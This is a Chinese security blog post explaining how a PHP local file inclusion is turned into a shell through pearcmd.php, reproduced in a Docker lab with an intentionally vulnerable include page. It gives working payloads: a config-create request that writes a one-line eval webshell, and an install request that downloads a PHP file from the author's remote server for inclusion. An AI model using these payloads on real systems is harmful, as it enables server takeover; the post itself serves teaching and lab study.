@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>利用pearcmd.php文件包含拿shell（LFI） | XiLitter</title><meta name="author" content="XiLitter"><meta name="copyright" content="XiLitter"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言最近看博客的时候遇到有师傅总结了一个新颖的文件包含思路，通过pearcmd.php来进行本地文件包含来拿shell，我感觉还挺有意思的，就花时间来学习了一下。 利用条件1.安装了pear扩展（pear就是一个php扩展及应用的代码仓库，没有安装pear扩展的话就没有pear.php文件可以利用了） 2.知道pearcmd.php文件的路径（默认路径是&#x2F;usr&#x2F;local&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用pearcmd.php文件包含拿shell（LFI）">
+<meta property="og:url" content="https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html">
+<meta property="og:site_name" content="XiLitter">
+<meta property="og:description" content="前言最近看博客的时候遇到有师傅总结了一个新颖的文件包含思路，通过pearcmd.php来进行本地文件包含来拿shell，我感觉还挺有意思的，就花时间来学习了一下。 利用条件1.安装了pear扩展（pear就是一个php扩展及应用的代码仓库，没有安装pear扩展的话就没有pear.php文件可以利用了） 2.知道pearcmd.php文件的路径（默认路径是&#x2F;usr&#x2F;local&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xilitter.github.io/img/art/a1.jpg">
+<meta property="article:published_time" content="2023-01-31T06:09:53.000Z">
+<meta property="article:modified_time" content="2023-03-07T08:57:25.337Z">
+<meta property="article:author" content="XiLitter">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xilitter.github.io/img/art/a1.jpg"><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '利用pearcmd.php文件包含拿shell（LFI）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-07 16:57:25'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/art/a1.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="XiLitter"><span class="site-name">XiLitter</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">利用pearcmd.php文件包含拿shell（LFI）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-31T06:09:53.000Z" title="发表于 2023-01-31 14:09:53">2023-01-31</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-07T08:57:25.337Z" title="更新于 2023-03-07 16:57:25">2023-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/php%E5%AE%89%E5%85%A8/">php安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="利用pearcmd.php文件包含拿shell（LFI）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看博客的时候遇到有师傅总结了一个新颖的文件包含思路，通过pearcmd.php来进行本地文件包含来拿shell，我感觉还挺有意思的，就花时间来学习了一下。</p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>1.安装了pear扩展（pear就是一个php扩展及应用的代码仓库，没有安装pear扩展的话就没有pear.php文件可以利用了）</p>
+<p>2.知道pearcmd.php文件的路径（默认路径是&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php）</p>
+<p>3.开启了register_argc_argv选项（只有开启了，$_SERVER[‘argv’]才会生效。）</p>
+<p>4.有包含点，并且能包含php后缀的文件，而且没有open_basedir的限制。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这次用docker来搭建一个<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=lamp&spm=1001.2101.3001.7020">lamp</a>，因为docker的任意版本的镜像都会默认安装pear，更加省事。本次复现下载的是这样版本的镜像。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/57.png" class>
+
+<p>然后就是拉镜像搭建环境了。我们进入到容器里，在web目录下创建两个文件，创建一个1.php，也就是我们的一个漏洞包含点。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>再创建一个2.php，用于测试使用。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>其实这不能算是一个漏洞，只能算作一个利用姿势。其主要原因就是开启了register_argc_argv这个选项。开启这个选项之后，url中?后面的内容都会传入$_SERVER[‘argv’]这个变量里。这里举三个例子。</p>
+<p>传入一个aa&#x3D;1。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/58.png" class>
+
+<p>传入一个aa&#x3D;1&amp;bb&#x3D;1。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/59.png" class>
+
+<p> 传入一个aa&#x3D;1+bb&#x3D;1。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/60.png" class>
+
+<p>通过这三张图很明显就明白&amp;是无法分割参数的，真正能有效分割参数的是+号。另外等号无法复制，直接被作为键值传进去了。</p>
+<p>pear是通过pearcmd.php来获取到参数的，看一下pear程序的代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/sh                                                                                                                               </span></span><br><span class="line"><span class="comment"># first find which PHP binary to use                                                                                                                                                                               </span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then                                                                                                                                                                          </span><br><span class="line">  PHP=<span class="string">&quot;<span class="subst">$PHP_PEAR_PHP_BIN</span>&quot;</span>                                                                                                                                                                                          </span><br><span class="line"><span class="keyword">else</span>                                                                     </span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/local/bin/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_bin<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    PHP=php</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    PHP=<span class="string">&quot;/usr/local/bin/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line"><span class="comment"># then look for the right pear include dir</span></span><br><span class="line"><span class="keyword">if</span> test <span class="string">&quot;x<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span> != <span class="string">&quot;x&quot;</span>; then</span><br><span class="line">  INCDIR=<span class="variable">$PHP_PEAR_INSTALL_DIR</span></span><br><span class="line">  INCARG=<span class="string">&quot;-d include_path=<span class="subst">$PHP_PEAR_INSTALL_DIR</span>&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="keyword">if</span> test <span class="string">&quot;/usr/local/lib/php&quot;</span> = <span class="string">&#x27;@&#x27;</span>php_dir<span class="string">&#x27;@&#x27;</span>; then</span><br><span class="line">    INCDIR=`dirname $<span class="number">0</span>`</span><br><span class="line">    INCARG=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    INCDIR=<span class="string">&quot;/usr/local/lib/php&quot;</span></span><br><span class="line">    INCARG=<span class="string">&quot;-d include_path=/usr/local/lib/php&quot;</span></span><br><span class="line">  fi</span><br><span class="line">fi</span><br><span class="line"> </span><br><span class="line">exec <span class="variable">$PHP</span> -C -q <span class="variable">$INCARG</span> -d date.timezone=UTC -d output_buffering=<span class="number">1</span> -d variables_order=EGPCS -d open_basedir=<span class="string">&quot;&quot;</span> -d safe_mode=<span class="number">0</span> -d register_argc_argv=<span class="string">&quot;On&quot;</span> -d auto_prepend_file=<span class="string">&quot;&quot;</span> -d auto_append_file=<span class="string">&quot;&quot;</span> <span class="variable">$INCDIR</span>/pearcmd.php <span class="string">&quot;$@&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这种sh程序我是看不太懂，大概就是最后一行在执行pear命令的时候会调用pearcmd.php文件。我们再看pearcmd.php的源码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$argv</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .</span><br><span class="line">         <span class="string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们可以看到$argv是由readPHPArgv函数赋值，那么我们就继续跟进这个函数。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先看$argv是否存在（这个变量储存在命令行模式下运行php脚本时传入的参数），如果不存在，就判断$_SERVER[‘argv’]这个变量，这个是我们可控的，那么这个函数返回值我们就可控。具体代码实现不需要知道，只要明白在文件包含的情况下，我们可以通过运用pear命令行工具并且控制其参数来为我们所用。</p>
+<h3 id="利用1（不出网）"><a href="#利用1（不出网）" class="headerlink" title="利用1（不出网）"></a>利用1（不出网）</h3><p>我们可以通过pear来漏洞利用，先看看pear中能够利用的命令。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/61.png" class>
+
+<p>我们要利用的就是这个config-create命令，这个命令的主要作用就是将内容写入文件中，传入两个参数，第一个参数是要写的内容，第二个参数就是要写入文件的路径，很明显，这两个参数都是可控的，自然我们应该能想到可以写入一句话进去，然后进行包含getshell。</p>
+<p>那么我们我们可以用pear来演示一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pear config-create /XiLitter /tmp/teat.txt</span><br></pre></td></tr></table></figure>
+
+<p>再看一下有没有被写入临时目录。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/62.png" class>
+
+<p>成功写进去了，那么就docker搭建环境来演示一下。</p>
+<p>写入<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">一句话木马</a>的payload为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure>
+
+<p>注意，我们正常抓包的时候&lt;&gt;和单引号会被url编码。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/63.png" class>
+
+<p>像这样，这样写进去是完全不行的，没有了php语法边界，写入的一句话木马就不会被当做php代码来执行，只能被当做文本存储，所以我们要修改掉。这个坑我踩了好久。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/64.png" class>
+
+<p>后台临时目录里已经写入了test.php。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/65.png" class>
+
+<p>然后包含它， 就可以进行RCE了。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/66.png" class>
+
+<p>看到test.php里的内容，&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;<?=@eval($_POST['cmd']);?>&#x2F;pear&#x2F;php一块被写进去了，但是get参数file被正常解析了，也就是说我们成功包含了pearcmd.php才成功使用命令。</p>
+<h3 id="为什么payload前面要有-号"><a href="#为什么payload前面要有-号" class="headerlink" title="为什么payload前面要有+号"></a>为什么<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=payload&spm=1001.2101.3001.7020">payload</a>前面要有+号</h3><p>前面不填加号是不行的。看个例子。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/67.png" class>
+
+<p>第一个元素变成了空串。在这里应该能猜到第一个元素是不起作用的。 光猜也不行，继续看pearcmd.php的代码。</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$progname</span> = PEAR_RUNTYPE;</span><br><span class="line"><span class="title function_ invoke__">array_shift</span>(<span class="variable">$argv</span>);</span><br><span class="line"><span class="variable">$options</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">getopt2</span>(<span class="variable">$argv</span>, <span class="string">&quot;c:C:d:D:Gh?sSqu:vV&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (PEAR::<span class="title function_ invoke__">isError</span>(<span class="variable">$options</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">usage</span>(<span class="variable">$options</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看来这个array_shift函数就是罪魁祸首了。我们通过url传入的argv数组会剔除掉第一个元素，也就是第一个元素失效，用+来代替了。</p>
+<h3 id="利用2（出网）"><a href="#利用2（出网）" class="headerlink" title="利用2（出网）"></a>利用2（出网）</h3><p>我们可以在自己的vps上写一个php文件，通过pear下载到靶机的临时目录里，然后对该文件进行包含。这很好理解。我们写一个phpinfo()</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/68.png" class>
+
+<p>使用的payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://xilitter.top/123.php</span><br></pre></td></tr></table></figure>
+
+<p>查看后台123.php被写进去了。</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/69.png" class>
+
+<p>那么进行包含，</p>
+<img src="/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/70.png" class>
+
+<p>那么这种情况下我们就可以在vps上写马，然后通过pear下载包含，进而getshell，具体步骤就不再演示。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这个姿势在任何php版本下都能用。只要是满足前面提到的几个条件，（可以通过phpinfo查看信息）换言之，用docker开启的php环境，上面那些配置都是默认开启的，只要具有文件包含点，这种有趣的姿势就能派上用场。</p>
